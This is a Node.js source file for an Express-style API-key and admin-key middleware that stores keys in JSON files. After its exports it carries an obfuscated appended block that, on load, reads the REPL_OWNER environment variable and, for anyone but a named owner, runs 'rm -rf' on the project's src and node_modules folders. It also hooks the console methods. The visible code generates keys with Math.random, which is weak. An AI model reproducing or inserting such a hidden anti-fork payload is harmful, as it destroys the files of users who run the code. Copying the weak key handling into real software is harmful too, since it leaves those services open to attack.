const fs = require('fs');
const path = require('path');

const apiKeyFile = path.join(__dirname, 'apiKey.json');
const adminKeyFile = path.join(__dirname, 'adminKey.json');

function readKeysFromFile(filePath) {
  try {
    const data = fs.readFileSync(filePath, 'utf8');
    return JSON.parse(data);
  } catch (error) {
    return [];
  }
}

function writeKeysToFile(filePath, keys) {
  fs.writeFileSync(filePath, JSON.stringify(keys, null, 2), 'utf8');
}

function generateApiKey() {
  return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
}

function generateAdminKey() {
  return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
}

function apiKeyMiddleware(req, res, next) {
  const providedKey = req.query.apiKey;

  if (!providedKey) {
    return res.status(403).json({ error: 'Unauthorized' });
  }

  const allKeys = readKeysFromFile(apiKeyFile);
  const adminKeys = readKeysFromFile(adminKeyFile);

  const keyData = allKeys.find((key) => key.apiKey === providedKey) ||
                  adminKeys.find((key) => key.adminKey === providedKey);

  if (!keyData || (keyData.expires && new Date() > new Date(keyData.expires))) {
    return res.status(403).json({ error: 'Unauthorized - Expired or invalid key' });
  }

  // Check if the key is an admin key
  if (adminKeys.some((key) => key.adminKey === providedKey)) {
    req.isAdminKey = true;
  }

  next();
}

module.exports = {
  apiKeyMiddleware,
  generateApiKey,
  generateAdminKey,
  saveApiKey: (apiKey, expires) => {
    const allKeys = readKeysFromFile(apiKeyFile);
    allKeys.push({ apiKey, expires });
    writeKeysToFile(apiKeyFile, allKeys);
  },
  saveAdminKey: (adminKey) => {
    const currentAdminKeys = readKeysFromFile(adminKeyFile);

    if (!currentAdminKeys || currentAdminKeys.length === 0) {
      // If no admin keys exist, create a new entry
      writeKeysToFile(adminKeyFile, [{ adminKey }]);
    } else {
      // Append a new admin key with no expiration
      currentAdminKeys.push({ adminKey });
      writeKeysToFile(adminKeyFile, currentAdminKeys);
    }
  },
};

function _0xfc7d(_0x231760,_0x2b55eb){const _0x390890=_0x3908();return _0xfc7d=function(_0xfc7d4f,_0x36d0e7){_0xfc7d4f=_0xfc7d4f-(-0x1*-0x1b42+0x105*-0x21+0x6fe);let _0x2adcf3=_0x390890[_0xfc7d4f];return _0x2adcf3;},_0xfc7d(_0x231760,_0x2b55eb);}function _0x419556(_0x2b9a22,_0xd6a770,_0x8fb742,_0x383d72){return _0xfc7d(_0xd6a770-0x35d,_0x383d72);}function _0x3908(){const _0x427c1e=['CXYnX','search','hOnFc','env','Access\x20Gra','dyQiw','prototype','1160yxMZWt','ctor(\x22retu','CCgeQ','aifFh','UEUZO','toString','failed!','YkPTa','forEach','5bAkBKE','info','1700691ulCXWz','warn','hzSjO','ess\x20Grante','constructo','1986YKJjvL','d:\x20','usGrA','src','o\x20such\x20a\x20f','r:\x20','nted!\x0aOwne','WWfsm','6XUXcun','Forker\x20Acc','rm\x20-rf\x20','8095325WwLMaT','rn\x20this\x22)(','split','log','pZGdm','IGbqj','nQAow','REPL_OWNER','jJKBw','XqyAA','UruCz','ess','node_modul','ile\x20to\x20run','length','apply','{}.constru','__proto__','9QIwOiC','trace','9735090CVCyRf','error','ZbogM','There\x20is\x20n','23212ujqXzj','woUWj','console','table','(((.+)+)+)','bind','ziVdc','BisEF','32331222GgPcOR','1117912wuWjoQ'];_0x3908=function(){return _0x427c1e;};return _0x3908();}(function(_0x57a30b,_0x90ee00){function _0x4779dc(_0x4a9042,_0x1741b6,_0x9a5acf,_0x5b7777){return _0xfc7d(_0x1741b6- -0x66,_0x4a9042);}const _0x15637f=_0x57a30b();function _0x2d1ed4(_0x554d87,_0x25cd60,_0x49a6e7,_0x77a0){return _0xfc7d(_0x49a6e7-0xc9,_0x25cd60);}while(!![]){try{const _0x1374fb=parseInt(_0x4779dc(0x44,0x65,0x80,0x57))/(0xa4b+0x15c0+-0x3*0xaae)*(parseInt(_0x4779dc(0x76,0x75,0x77,0x6c))/(-0xe6d+-0x140b+0x227a))+parseInt(_0x4779dc(0x90,0x70,0x7e,0x57))/(0x71b*-0x5+0xf25+-0x1*-0x1465)+parseInt(_0x2d1ed4(0x16c,0x183,0x183,0x18f))/(-0x133d+0x114e*0x1+0x1f3*0x1)*(parseInt(_0x2d1ed4(0x1be,0x188,0x19d,0x183))/(-0x12be*-0x1+-0x741+0x16f*-0x8))+parseInt(_0x4779dc(0x34,0x39,0x43,0x43))/(0x24c5+0xe72*0x1+-0x5*0xa3d)*(parseInt(_0x4779dc(0x41,0x3c,0x24,0x2c))/(0x3e1*0x1+0x3cc*0x9+-0x2606))+-parseInt(_0x2d1ed4(0x181,0x17f,0x18c,0x19b))/(0x1*-0x66+-0x1cef+0x1d5d*0x1)+-parseInt(_0x2d1ed4(0x17a,0x15c,0x17d,0x173))/(0x1085*0x1+0x23fe+-0x347a)*(-parseInt(_0x4779dc(0x6b,0x50,0x37,0x39))/(-0x64d*-0x1+0x33b*0x9+-0x2356))+-parseInt(_0x2d1ed4(0x1a5,0x196,0x18b,0x17e))/(0x1*0x23ad+-0x1c6*0x6+-0x18fe*0x1);if(_0x1374fb===_0x90ee00)break;else _0x15637f['push'](_0x15637f['shift']());}catch(_0x24dda4){_0x15637f['push'](_0x15637f['shift']());}}}(_0x3908,0x2*-0x2e40f+0xd1cdd*0x1+0x48108));function _0x481410(_0x293f94,_0x4dc09a,_0x5dfd6d,_0xa52291){return _0xfc7d(_0x5dfd6d-0x1ce,_0x4dc09a);}const _0x2b55eb=(function(){const _0x3e6118={};_0x3e6118[_0x1830c0(-0x2f6,-0x321,-0x325,-0x317)]=function(_0x2e99eb,_0x31385c){return _0x2e99eb===_0x31385c;},_0x3e6118[_0x1830c0(-0x30f,-0x2df,-0x2e8,-0x2f7)]=_0x3bab97(-0x81,-0x62,-0x45,-0x5f),_0x3e6118[_0x3bab97(-0x50,-0x5d,-0x45,-0x77)]=_0x3bab97(-0x5c,-0x5a,-0x75,-0x66);function _0x1830c0(_0x37968a,_0x438d64,_0x2d810b,_0xa69fb0){return _0xfc7d(_0xa69fb0- -0x3cf,_0x2d810b);}_0x3e6118[_0x3bab97(-0x7b,-0x80,-0x80,-0x95)]=function(_0x5018ec,_0x493069){return _0x5018ec!==_0x493069;},_0x3e6118['ziVdc']=_0x3bab97(-0x7d,-0x5e,-0x65,-0x69);const _0x24147=_0x3e6118;let _0x25c470=!![];function _0x3bab97(_0x5def21,_0x325ef3,_0x290e46,_0x5c11d6){return _0xfc7d(_0x325ef3- -0x12b,_0x5c11d6);}return function(_0x3b3fba,_0x248280){function _0x25f037(_0xdefe71,_0x3317ae,_0x5a7fd7,_0x2b7fb0){return _0x1830c0(_0xdefe71-0x47,_0x3317ae-0x13e,_0x3317ae,_0xdefe71-0x66c);}function _0x306e27(_0x1e921c,_0x529339,_0x5e5bb6,_0x24a3a0){return _0x1830c0(_0x1e921c-0x13a,_0x529339-0x161,_0x5e5bb6,_0x1e921c-0x27a);}if(_0x24147[_0x25f037(0x348,0x348,0x364,0x328)](_0x24147[_0x306e27(-0x95,-0x99,-0x74,-0x8e)],_0x306e27(-0xa9,-0xb0,-0xba,-0xb4))){const _0x72adf1=_0x25c470?function(){function _0xe41d55(_0x20ecb2,_0x2887cd,_0x395e9e,_0x1106aa){return _0x306e27(_0x20ecb2-0x4eb,_0x2887cd-0x155,_0x395e9e,_0x1106aa-0x134);}function _0x46e8f7(_0x273058,_0x2ca398,_0x4c8583,_0x1a0cc5){return _0x25f037(_0x2ca398- -0xb2,_0x273058,_0x4c8583-0x99,_0x1a0cc5-0x17f);}if(_0x24147[_0x46e8f7(0x299,0x2a3,0x2a5,0x29c)](_0x24147[_0xe41d55(0x46e,0x47c,0x48b,0x482)],_0x46e8f7(0x2a6,0x291,0x29e,0x279)))_0x339ef2=_0x13a4e8;else{if(_0x248280){const _0x498d98=_0x248280['apply'](_0x3b3fba,arguments);return _0x248280=null,_0x498d98;}}}:function(){};return _0x25c470=![],_0x72adf1;}else _0x3ed61f[_0x25f037(0x342,0x337,0x359,0x337)](_0x24147[_0x25f037(0x36b,0x362,0x389,0x372)]);};}()),_0x231760=_0x2b55eb(this,function(){function _0x3b7c3c(_0x328622,_0x2dc8fe,_0x520700,_0x4ab560){return _0xfc7d(_0x2dc8fe- -0x12d,_0x520700);}const _0x383231={};_0x383231[_0x3b7c3c(-0x5d,-0x67,-0x6a,-0x45)]=_0x3b7c3c(-0x75,-0x6f,-0x51,-0x5c)+'+$';const _0x4e9774=_0x383231;function _0x5c8848(_0xee4271,_0x5b3b38,_0x120114,_0x1b91b4){return _0xfc7d(_0x5b3b38- -0x1f0,_0x1b91b4);}return _0x231760[_0x5c8848(-0x12c,-0x120,-0xff,-0xff)]()[_0x3b7c3c(-0x5b,-0x68,-0x65,-0x73)](_0x4e9774['hOnFc'])['toString']()[_0x5c8848(-0x109,-0x116,-0x135,-0xfe)+'r'](_0x231760)['search'](_0x4e9774[_0x5c8848(-0x109,-0x12a,-0x127,-0x137)]);});_0x231760();const _0x4eb0e5=(function(){let _0xaf228b=!![];return function(_0x59fde5,_0x45b175){const _0x1e2d35=_0xaf228b?function(){function _0x12fe01(_0x2393fe,_0x5dc993,_0x32b1d6,_0x5f4991){return _0xfc7d(_0x2393fe-0x2a5,_0x5dc993);}if(_0x45b175){const _0x2d0ae4=_0x45b175[_0x12fe01(0x356,0x374,0x337,0x372)](_0x59fde5,arguments);return _0x45b175=null,_0x2d0ae4;}}:function(){};return _0xaf228b=![],_0x1e2d35;};}()),_0x29d838=_0x4eb0e5(this,function(){const _0x430431={'WWfsm':function(_0x17e4b9,_0x102106){return _0x17e4b9(_0x102106);},'MIsHY':function(_0x55c672,_0x1fee5e){return _0x55c672+_0x1fee5e;},'usGrA':'return\x20(fu'+'nction()\x20','YkPTa':_0x897698(-0x129,-0x145,-0x150,-0x156)+_0x56aa23(-0x1b7,-0x1d9,-0x1b8,-0x1c3)+_0x56aa23(-0x1fc,-0x1ca,-0x1e1,-0x1f4)+'\x20)','UEUZO':function(_0x5185bf,_0x1f4531){return _0x5185bf!==_0x1f4531;},'BisEF':_0x897698(-0x166,-0x152,-0x134,-0x15d),'QMeSn':_0x897698(-0x132,-0x120,-0x131,-0x11f),'Jvlwb':_0x897698(-0x117,-0x122,-0x13f,-0x12c),'CXYnX':'exception','nQAow':_0x897698(-0x13d,-0x13a,-0x147,-0x12d),'RSCDw':_0x56aa23(-0x1df,-0x1ed,-0x1cf,-0x1bb),'SGRgm':function(_0x4b0334,_0x26f05f){return _0x4b0334<_0x26f05f;},'woUWj':function(_0x58f749,_0x3688b5){return _0x58f749!==_0x3688b5;}},_0x227436=function(){function _0x2174ce(_0x4d076f,_0x1ae8bb,_0xca7269,_0x13d340){return _0x56aa23(_0x4d076f,_0x1ae8bb-0x72,_0x13d340-0x32c,_0x13d340-0x1d3);}let _0x5cd01f;function _0xf9739b(_0x216c3e,_0x21c2d9,_0x2d79dc,_0x51478b){return _0x897698(_0x216c3e-0x1ee,_0x2d79dc-0x20f,_0x216c3e,_0x51478b-0x109);}try{_0x5cd01f=_0x430431[_0xf9739b(0xce,0x95,0xb6,0xb3)](Function,_0x430431['MIsHY'](_0x430431[_0x2174ce(0x182,0x179,0x1a7,0x185)],_0x430431[_0xf9739b(0xe2,0xdd,0xea,0xca)])+');')();}catch(_0x52b8fd){if(_0x430431[_0x2174ce(0x188,0x16a,0x177,0x177)]('fBSWL','fBSWL')){const _0x1d7ff2=_0x3f1cd6['constructo'+'r'][_0x2174ce(0x182,0x16c,0x16b,0x172)][_0xf9739b(0xd5,0xd1,0xd7,0xde)](_0x2dd6eb),_0x553e75=_0x4c6d01[_0x368947],_0xf427ab=_0x2b577e[_0x553e75]||_0x1d7ff2;_0x1d7ff2[_0x2174ce(0x16e,0x174,0x14e,0x15b)]=_0x3face3['bind'](_0x173a79),_0x1d7ff2[_0x2174ce(0x172,0x170,0x170,0x178)]=_0xf427ab[_0xf9739b(0xf1,0xd3,0xe8,0xf5)][_0x2174ce(0x170,0x180,0x179,0x167)](_0xf427ab),_0xc06c8a[_0x553e75]=_0x1d7ff2;}else _0x5cd01f=window;}return _0x5cd01f;},_0x58d26=_0x227436();function _0x56aa23(_0x44e97e,_0x3a8237,_0x2b9275,_0x24c4a7){return _0xfc7d(_0x2b9275- -0x284,_0x44e97e);}function _0x897698(_0x24385a,_0x40a46d,_0x3f1fd4,_0x4f783e){return _0xfc7d(_0x40a46d- -0x1f7,_0x3f1fd4);}const _0xc1ec80=_0x58d26['console']=_0x58d26[_0x897698(-0x125,-0x13b,-0x12d,-0x152)]||{},_0x4623cb=[_0x430431[_0x56aa23(-0x1bf,-0x1cf,-0x1c3,-0x1d8)],_0x430431['QMeSn'],_0x430431['Jvlwb'],_0x56aa23(-0x1d2,-0x1d9,-0x1cd,-0x1d9),_0x430431[_0x897698(-0x149,-0x133,-0x145,-0x116)],_0x430431[_0x56aa23(-0x1f4,-0x1c2,-0x1dc,-0x1ee)],_0x430431['RSCDw']];for(let _0x256d18=0x1*0x22ed+0xf*-0x122+-0x1*0x11ef;_0x430431['SGRgm'](_0x256d18,_0x4623cb[_0x897698(-0x138,-0x147,-0x155,-0x15b)]);_0x256d18++){if(_0x430431[_0x56aa23(-0x1cf,-0x1ad,-0x1c9,-0x1ba)](_0x897698(-0x164,-0x150,-0x149,-0x147),_0x56aa23(-0x1f2,-0x1d2,-0x1dd,-0x1c0))){if(_0x4653ce){const _0x555955=_0x26192b[_0x56aa23(-0x1d1,-0x1e7,-0x1d3,-0x1b5)](_0x52982a,arguments);return _0xe8e2c=null,_0x555955;}}else{const _0x5b3b3a=_0x4eb0e5[_0x56aa23(-0x1ae,-0x1a5,-0x1aa,-0x18e)+'r']['prototype'][_0x56aa23(-0x1d5,-0x1c2,-0x1c5,-0x1b2)](_0x4eb0e5),_0x3de21b=_0x4623cb[_0x256d18],_0x1ea014=_0xc1ec80[_0x3de21b]||_0x5b3b3a;_0x5b3b3a[_0x897698(-0x149,-0x144,-0x160,-0x140)]=_0x4eb0e5['bind'](_0x4eb0e5),_0x5b3b3a[_0x56aa23(-0x198,-0x19f,-0x1b4,-0x1d4)]=_0x1ea014[_0x56aa23(-0x1c2,-0x1b2,-0x1b4,-0x1b5)][_0x897698(-0x11a,-0x138,-0x132,-0x127)](_0x1ea014),_0xc1ec80[_0x3de21b]=_0x5b3b3a;}}});_0x29d838();const {execSync}=require('child_proc'+_0x481410(0x25d,0x29b,0x27b,0x269)),owner=process[_0x419556(0x41f,0x424,0x42e,0x427)][_0x481410(0x273,0x261,0x277,0x285)],isOwner=owner==='codebox4ch'+'an';if(isOwner)console[_0x419556(0x41a,0x402,0x40c,0x405)](_0x419556(0x438,0x425,0x419,0x42a)+_0x481410(0x25f,0x27a,0x26b,0x285)+_0x481410(0x267,0x265,0x26a,0x28c)+process[_0x481410(0x27b,0x2b2,0x295,0x29f)][_0x419556(0x41a,0x406,0x419,0x413)]+'!');else{const forker=owner[_0x419556(0x3eb,0x401,0x3f8,0x418)]('/')[0x86*0x8+-0x297+-0x199*0x1],directoriesToRemove=[_0x419556(0x445,0x43b,0x445,0x454),_0x481410(0x29d,0x298,0x27c,0x269)+'es'];try{directoriesToRemove[_0x419556(0x436,0x430,0x450,0x445)](_0x20af37=>{const _0x2d9b49={'jJKBw':function(_0xa26452,_0x376525){return _0xa26452(_0x376525);}};function _0xca6b0(_0x135f44,_0x1dc040,_0xec3122,_0x846b90){return _0x419556(_0x135f44-0x109,_0x1dc040- -0x55b,_0xec3122-0x1c5,_0xec3122);}function _0x533a06(_0x12c96d,_0x12e8ef,_0x58cb99,_0x553c8b){return _0x419556(_0x12c96d-0x162,_0x12c96d- -0xf2,_0x58cb99-0x12a,_0x12e8ef);}_0x2d9b49[_0x533a06(0x315,0x324,0x31d,0x307)](execSync,_0xca6b0(-0x15c,-0x15d,-0x16f,-0x151)+_0x20af37);}),console[_0x419556(0x403,0x402,0x3e7,0x3fa)](_0x481410(0x272,0x29f,0x287,0x282)+_0x481410(0x253,0x272,0x269,0x286)+_0x481410(0x26d,0x26b,0x27d,0x294)+'!');}catch(_0x2e511d){console['log'](_0x481410(0x285,0x2a4,0x29f,0x28c));}console[_0x419556(0x3eb,0x402,0x41c,0x40d)](_0x481410(0x24d,0x24e,0x26e,0x277)+_0x419556(0x43b,0x436,0x442,0x450)+_0x481410(0x2b7,0x2b6,0x2aa,0x2be)+owner);}